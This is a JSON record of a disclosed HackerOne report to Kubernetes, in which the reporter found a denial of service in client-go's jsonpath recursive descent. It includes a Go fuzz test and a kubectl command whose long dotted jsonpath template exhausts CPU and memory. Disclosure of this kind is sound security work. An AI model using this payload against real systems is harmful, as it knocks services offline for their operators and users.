@@ -1,0 +1,210 @@
+{
+  "id": 882923,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODI5MjM=",
+  "url": "https://hackerone.com/reports/882923",
+  "title": "DoS for client-go jsonpath func",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-26T15:31:15.487Z",
+  "submitted_at": "2020-05-26T15:31:15.487Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lazydog",
+    "url": "/lazydog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-07-24T03:46:15.593Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-24T03:46:15.531Z",
+  "team_member_agreed_on_going_public_at": "2020-07-23T23:14:24.782Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\njsonpath recursive descent  cause a DoS vul\n`kubectl` `apiextensions-apiserver` `cli-runtime` and `kubernetes` is depends on `client-go`\n\nI think `evalRecursive()` cause of this vulnerability\nfunction pos: client-go/util/jsonpath/jsonpath.go:451\n\n## Component Version:\n\nclient-go:master\n\n## Steps To Reproduce:\ni written a simple fuzz based on  go-fuzz, im so lucky to found a crasher.\n\n  1. pull the latest kubernetes code \n\n```\ngit clone https://github.com/kubernetes/kubernetes\n```\n\n  2.change workdir to  `kubernetes/staging/src/k8s.io/client-go/util/jsonpath`\n3.copy this poc to disk use `vim` or `cat`, change filename to `crash_tests.go`\n\n```\npackage jsonpath\n\nimport (\n\t\"testing\"\n \t\"bytes\"\n \t\"encoding/json\"\n)\n\ntype jsonpathcrashTest struct {\n name     string\n template string\n input    interface{}\n}\n\nfunc FuzzParse(test *jsonpathcrashTest, allowMissingKeys bool) error {\n\n j := New(test.name)\n\n j.AllowMissingKeys(allowMissingKeys)\n err := j.Parse(test.template)\n if err != nil {\n  return err\n }\n\n buf := new(bytes.Buffer)\n err = j.Execute(buf, test.input)\n if err != nil {\n  return err\n }\n\n return err\n}\n\nfunc Fuzz(data []byte) int {\n var input = []byte(`{\n  \"kind\": \"List\",\n  \"items\":[\n    {\n   \"kind\":\"None\",\n   \"metadata\":{\n     \"name\":\"127.0.0.1\",\n     \"labels\":{\n    \"kubernetes.io/hostname\":\"127.0.0.1\"\n     }\n   },\n   \"status\":{\n     \"capacity\":{\"cpu\":\"4\"},\n     \"ready\": true,\n     \"addresses\":[{\"type\": \"LegacyHostIP\", \"address\":\"127.0.0.1\"}]\n   }\n    },\n    {\n   \"kind\":\"None\",\n   \"metadata\":{\n     \"name\":\"127.0.0.2\",\n     \"labels\":{\n    \"kubernetes.io/hostname\":\"127.0.0.2\"\n     }\n   },\n   \"status\":{\n     \"capacity\":{\"cpu\":\"8\"},\n     \"ready\": false,\n     \"addresses\":[\n    {\"type\": \"LegacyHostIP\", \"address\":\"127.0.0.2\"},\n    {\"type\": \"another\", \"address\":\"127.0.0.3\"}\n     ]\n   }\n    }\n  ],\n  \"users\":[\n    {\n   \"name\": \"myself\",\n   \"user\": {}\n    },\n    {\n   \"name\": \"e2e\",\n   \"user\": {\"username\": \"admin\", \"password\": \"secret\"}\n   }\n  ]\n   }`)\n\n var nodesData interface{}\n err := json.Unmarshal(input, &nodesData)\n if err != nil {\n  print(err)\n }\n\n fuzzData := string(data)\n\n test := jsonpathcrashTest{name: \"crash\", template: fuzzData, input: nodesData}\n\n err = FuzzParse(&test, false)\n if err != nil {\n  return 0\n }\n\n err = FuzzParse(&test, true)\n if err != nil {\n  return 0\n }\n\n return 1\n}\n\n\nfunc TestCrash(t *testing.T) {\n\tvar data = []byte(\"{...................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"....................\" +\n\t\"..........51}.\")\n\tFuzz(data)\n}\n\n```\n\n\n\n4.run `go test` command, now we can see the test process use a lot of cpu and memeory\n\n\n{F843537}\n\n5.i found a real case in `kubectl`, if resource (like services pods node) has any record can cause DoS.\n\n```\nkubectl get services -o=jsonpath=\"{.....................................................................................................................................}\"\n```\n\n{F843557}\n\n## Impact\n\nmaybe in some scenes, attacker can cause DoS.\n\neg. cloud components use `client-go` util to process cluster resouce json record.\n\nany other program exec  `kubectl`  with jsonpath options, and jsonpath params by user control.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 843537,
+      "file_name": "DoS_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MyFnNJByUQBDCfzH84SLw64Y?response-content-disposition=attachment%3B%20filename%3D%22DoS_1.png%22%3B%20filename%2A%3DUTF-8%27%27DoS_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7GS3YI3Z%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050230Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDOizwrxJ1e16pZq0mDsw2hk1KqpKK9uH%2BBKzdFNknTiAIhAMynmw5EsfeZA0Yhy89IaBWXM9HE2AvJfTiMIh3mk79PKrIFCH4QAxoMMDEzNjE5Mjc0ODQ5IgxSIPpvCja%2FAqysvMsqjwXQz0nlgCp4%2BopRGBLzK4wjtoOQl3UYhobPSJ3t1Fnmh0ZRml6jk7vcSO2o50ALUNBhf9LTpWy6umfduG9vBpSlPE5%2FxxhHULFJQWI4%2BC2vPFYCJ4otLRuMcihYemttCpVV14aTjkgQWP3jyIv9g8m9900ngSHiCg3O9pweYqKRis%2BCNazFkU5PfwieOD%2B9DC0Jvc%2B4M6ovG3hXADdgv4sMazvYKG1vKs9kSB8M83l%2FBnionOc2AlTjso6BSmVRU8fpBAuSPAADtskATCokuRURmcjowPrIVM%2B6P7t7Tk5f80AaGI5sNdq44NILICxNtu58aRLUyHe9xadRv45nNTuXTUIbXwCHTW9rK2ZIV1rpfXbXOHyToS7HvSAwA3e5L8WzId7IAAP%2BKa9vMDKdkNT7oPoQlptvQ28QWZ4iwP4GQy7o%2Fd1pMkS8NjUAck0D1pIfG3lP9kVMM3k%2F%2FTJSc5vhYOUP9RXjN66WDNBC8XeOGMT4zz3si%2FuwxKoMrOhyiF3Z8lfG8cfQnsu8VeABRkS5KnO56WtdTjoxch3f6LmpLo4aMfh%2FnYaSK%2FZMKgYR7jpq1VQAjAe0wZC1ofmDbP3zSwCWVqxh53ZHMySFy7sc%2F9jHNimMLaifXzP5SUKbbWYP3OGevczRenMLDNhVqvStEMDPhHNPtMPjuoSyWZLTwe8T9xFI67F%2FZGIaGNkdBPH950SY0OkQ%2FLWEbyre3vXYtUCtpnFeUcwIekjOY9u8uI7ugANQtdCRRd%2F0900A5fa6iDb1Qn6wRcc6DWuDZf6WdDb33OYfnM7KnmR3f8%2BP5%2B62NBwhxSJpFDV%2F4oKklklY6BFx4tqwqz%2BBTcp7HxKsa5lPVDbiLnobkrwFm%2BvFMM%2But9IGOrABOUciHExQZMIYzwPwmpOAJ%2BvCFgHfegrIq6lWgm2fr2OzppL5%2FGKtGW6o3Tvop%2BYnxW3edJ2zbRjIi%2FfIMCdaTKJ60SlYN6FndbbCZVpgZxKxtHzpKYQKJe6CfMf40QwqTNDVvSeRBGPgVJzpXf1o1LlNLm4je7%2Fcos5Z1lyZsZodHyxbRwSNRF7GL5JHjPpkZdKxGOOjKhNU%2B6HUDlg71XC87tP6udnekHTNiprc0Ug%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=10ede8fef776fff554af94b16c8383c5ed9c2476dcc1d6981920886e02db630d",
+      "file_size": 107584,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 843557,
+      "file_name": "DoS_2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tuskrXgGKWjsHmiPY5Z2kXXd?response-content-disposition=attachment%3B%20filename%3D%22DoS_2.png%22%3B%20filename%2A%3DUTF-8%27%27DoS_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7GS3YI3Z%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050230Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDOizwrxJ1e16pZq0mDsw2hk1KqpKK9uH%2BBKzdFNknTiAIhAMynmw5EsfeZA0Yhy89IaBWXM9HE2AvJfTiMIh3mk79PKrIFCH4QAxoMMDEzNjE5Mjc0ODQ5IgxSIPpvCja%2FAqysvMsqjwXQz0nlgCp4%2BopRGBLzK4wjtoOQl3UYhobPSJ3t1Fnmh0ZRml6jk7vcSO2o50ALUNBhf9LTpWy6umfduG9vBpSlPE5%2FxxhHULFJQWI4%2BC2vPFYCJ4otLRuMcihYemttCpVV14aTjkgQWP3jyIv9g8m9900ngSHiCg3O9pweYqKRis%2BCNazFkU5PfwieOD%2B9DC0Jvc%2B4M6ovG3hXADdgv4sMazvYKG1vKs9kSB8M83l%2FBnionOc2AlTjso6BSmVRU8fpBAuSPAADtskATCokuRURmcjowPrIVM%2B6P7t7Tk5f80AaGI5sNdq44NILICxNtu58aRLUyHe9xadRv45nNTuXTUIbXwCHTW9rK2ZIV1rpfXbXOHyToS7HvSAwA3e5L8WzId7IAAP%2BKa9vMDKdkNT7oPoQlptvQ28QWZ4iwP4GQy7o%2Fd1pMkS8NjUAck0D1pIfG3lP9kVMM3k%2F%2FTJSc5vhYOUP9RXjN66WDNBC8XeOGMT4zz3si%2FuwxKoMrOhyiF3Z8lfG8cfQnsu8VeABRkS5KnO56WtdTjoxch3f6LmpLo4aMfh%2FnYaSK%2FZMKgYR7jpq1VQAjAe0wZC1ofmDbP3zSwCWVqxh53ZHMySFy7sc%2F9jHNimMLaifXzP5SUKbbWYP3OGevczRenMLDNhVqvStEMDPhHNPtMPjuoSyWZLTwe8T9xFI67F%2FZGIaGNkdBPH950SY0OkQ%2FLWEbyre3vXYtUCtpnFeUcwIekjOY9u8uI7ugANQtdCRRd%2F0900A5fa6iDb1Qn6wRcc6DWuDZf6WdDb33OYfnM7KnmR3f8%2BP5%2B62NBwhxSJpFDV%2F4oKklklY6BFx4tqwqz%2BBTcp7HxKsa5lPVDbiLnobkrwFm%2BvFMM%2But9IGOrABOUciHExQZMIYzwPwmpOAJ%2BvCFgHfegrIq6lWgm2fr2OzppL5%2FGKtGW6o3Tvop%2BYnxW3edJ2zbRjIi%2FfIMCdaTKJ60SlYN6FndbbCZVpgZxKxtHzpKYQKJe6CfMf40QwqTNDVvSeRBGPgVJzpXf1o1LlNLm4je7%2Fcos5Z1lyZsZodHyxbRwSNRF7GL5JHjPpkZdKxGOOjKhNU%2B6HUDlg71XC87tP6udnekHTNiprc0Ug%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0e5b1635caff77ad4692c6af9c198abcddfe806a803c7fa5f34a10f2fa35f7c8",
+      "file_size": 65773,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-22T23:14:24.943Z",
+  "allow_singular_disclosure_after": -185348885.87570372,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "lazydog",
+    "yxw21",
+    "tess",
+    "muh3ammed",
+    "h1-qualys-scan",
+    "th3_"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 32505,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/client-go",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "882923",
+  "votes": 6,
+  "latest_disclosable_activity_at": "2020-07-24T03:46:15.620Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:02:30.947761",
+    "source": "https://hackerone.com/reports/882923.json",
+    "report_id": 882923
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODI5MjM=",
+    "databaseId": "882923",
+    "title": "DoS for client-go jsonpath func",
+    "url": "https://hackerone.com/reports/882923",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-07-24T03:46:15.593Z",
+    "created_at": "2020-05-26T15:31:15.487Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzQ4",
+      "name": "Uncontrolled Resource Consumption",
+      "external_id": "cwe-400"
+    },
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "lazydog"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM5Mzg2",
+      "handle": "kubernetes",
+      "name": "Kubernetes",
+      "url": "https://hackerone.com/kubernetes",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yMjI0NjI=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-06-11T15:53:26.847Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzg4MjkyMw==",
+    "_id": "882923",
+    "disclosed": true,
+    "votes": 6,
+    "latest_disclosable_activity_at": "2020-07-24T03:46:15.620Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODI5MjM=",
+      "databaseId": "882923",
+      "title": "DoS for client-go jsonpath func",
+      "url": "https://hackerone.com/reports/882923",
+      "disclosed_at": "2020-07-24T03:46:15.593Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM5Mzg2",
+      "handle": "kubernetes",
+      "name": "Kubernetes",
+      "url": "https://hackerone.com/kubernetes",
+      "currency": "usd"
+    }
+  }
+}
